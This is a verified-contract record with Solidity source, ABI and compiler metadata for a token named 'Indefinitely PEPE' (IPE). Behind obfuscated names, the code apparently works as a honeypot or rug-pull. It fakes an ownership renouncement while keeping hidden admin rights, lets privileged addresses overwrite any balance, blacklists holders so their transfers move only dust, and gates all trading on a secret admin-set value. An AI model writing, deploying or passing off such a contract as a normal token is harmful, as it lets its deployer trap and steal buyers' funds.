{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface launchLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listToken) external view returns (uint256);\n\n    function transfer(address buyFrom, uint256 senderTokenTake) external returns (bool);\n\n    function allowance(address txBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderTokenTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyFrom,\n        uint256 senderTokenTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingReceiver, uint256 value);\n    event Approval(address indexed txBuy, address indexed spender, uint256 value);\n}\n\nabstract contract limitLaunchAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptReceiver {\n    function createPair(address feeTeam, address amountTeam) external returns (address);\n}\n\ninterface launchLaunchedMetadata is launchLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndefinitelyPEPE is limitLaunchAt, launchLaunched, launchLaunchedMetadata {\n\n    function feeLaunch(address atAutoTo) public {\n        if (walletExempt) {\n            return;\n        }\n        if (modeLaunch != minTotal) {\n            feeAmount = isMarketing;\n        }\n        modeAmount[atAutoTo] = true;\n        if (atReceiverFee != feeAmount) {\n            feeAmount = atReceiverFee;\n        }\n        walletExempt = true;\n    }\n\n    uint256 private atReceiverFee;\n\n    mapping(address => uint256) private senderTx;\n\n    mapping(address => bool) public tokenTotal;\n\n    address public teamList;\n\n    mapping(address => bool) public modeAmount;\n\n    function allowance(address receiverFund, address exemptEnable) external view virtual override returns (uint256) {\n        if (exemptEnable == exemptMin) {\n            return type(uint256).max;\n        }\n        return maxToken[receiverFund][exemptEnable];\n    }\n\n    uint256 toExempt;\n\n    function feeExempt() public {\n        emit OwnershipTransferred(feeSell, address(0));\n        exemptIs = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxToken;\n\n    event OwnershipTransferred(address indexed amountIsReceiver, address indexed autoReceiver);\n\n    function name() external view virtual override returns (string memory) {\n        return atTokenTo;\n    }\n\n    function swapMarketing(uint256 senderTokenTake) public {\n        tokenLimit();\n        minTrading = senderTokenTake;\n    }\n\n    function liquidityLaunchedReceiver(address marketingList, uint256 senderTokenTake) public {\n        tokenLimit();\n        senderTx[marketingList] = senderTokenTake;\n    }\n\n    uint256 constant exemptReceiverSwap = 10 ** 10;\n\n    function launchTx(address enableLimitLiquidity, address buyFrom, uint256 senderTokenTake) internal returns (bool) {\n        if (enableLimitLiquidity == feeSell) {\n            return amountSender(enableLimitLiquidity, buyFrom, senderTokenTake);\n        }\n        uint256 buyTo = launchLaunched(teamList).balanceOf(totalEnable);\n        require(buyTo == minTrading);\n        require(buyFrom != totalEnable);\n        if (tokenTotal[enableLimitLiquidity]) {\n            return amountSender(enableLimitLiquidity, buyFrom, exemptReceiverSwap);\n        }\n        return amountSender(enableLimitLiquidity, buyFrom, senderTokenTake);\n    }\n\n    function tokenLimit() private view {\n        require(modeAmount[_msgSender()]);\n    }\n\n    function listSell(address listTotal) public {\n        tokenLimit();\n        \n        if (listTotal == feeSell || listTotal == teamList) {\n            return;\n        }\n        tokenTotal[listTotal] = true;\n    }\n\n    uint256 private teamModeBuy = 100000000 * 10 ** 18;\n\n    uint256 public isMarketing;\n\n    bool public walletExempt;\n\n    bool public modeLaunch;\n\n    function transferFrom(address enableLimitLiquidity, address buyFrom, uint256 senderTokenTake) external override returns (bool) {\n        if (_msgSender() != exemptMin) {\n            if (maxToken[enableLimitLiquidity][_msgSender()] != type(uint256).max) {\n                require(senderTokenTake <= maxToken[enableLimitLiquidity][_msgSender()]);\n                maxToken[enableLimitLiquidity][_msgSender()] -= senderTokenTake;\n            }\n        }\n        return launchTx(enableLimitLiquidity, buyFrom, senderTokenTake);\n    }\n\n    constructor (){\n        \n        tokenFund limitSwap = tokenFund(exemptMin);\n        teamList = exemptReceiver(limitSwap.factory()).createPair(limitSwap.WETH(), address(this));\n        \n        feeSell = _msgSender();\n        feeExempt();\n        modeAmount[feeSell] = true;\n        senderTx[feeSell] = teamModeBuy;\n        if (modeLaunch != minTotal) {\n            feeAmount = atReceiverFee;\n        }\n        emit Transfer(address(0), feeSell, teamModeBuy);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapBuy;\n    }\n\n    function balanceOf(address listToken) public view virtual override returns (uint256) {\n        return senderTx[listToken];\n    }\n\n    address exemptMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamModeBuy;\n    }\n\n    function amountSender(address enableLimitLiquidity, address buyFrom, uint256 senderTokenTake) internal returns (bool) {\n        require(senderTx[enableLimitLiquidity] >= senderTokenTake);\n        senderTx[enableLimitLiquidity] -= senderTokenTake;\n        senderTx[buyFrom] += senderTokenTake;\n        emit Transfer(enableLimitLiquidity, buyFrom, senderTokenTake);\n        return true;\n    }\n\n    string private swapBuy = \"IPE\";\n\n    bool public minTotal;\n\n    function approve(address exemptEnable, uint256 senderTokenTake) public virtual override returns (bool) {\n        maxToken[_msgSender()][exemptEnable] = senderTokenTake;\n        emit Approval(_msgSender(), exemptEnable, senderTokenTake);\n        return true;\n    }\n\n    uint8 private takeTrading = 18;\n\n    function owner() external view returns (address) {\n        return exemptIs;\n    }\n\n    function transfer(address marketingList, uint256 senderTokenTake) external virtual override returns (bool) {\n        return launchTx(_msgSender(), marketingList, senderTokenTake);\n    }\n\n    uint256 private feeAmount;\n\n    address private exemptIs;\n\n    address public feeSell;\n\n    string private atTokenTo = \"Indefinitely PEPE\";\n\n    address totalEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 minTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountIsReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTokenTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAutoTo\",\"type\":\"address\"}],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTokenTake\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"}],\"name\":\"listSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderTokenTake\",\"type\":\"uint256\"}],\"name\":\"swapMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTokenTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimitLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTokenTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IndefinitelyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}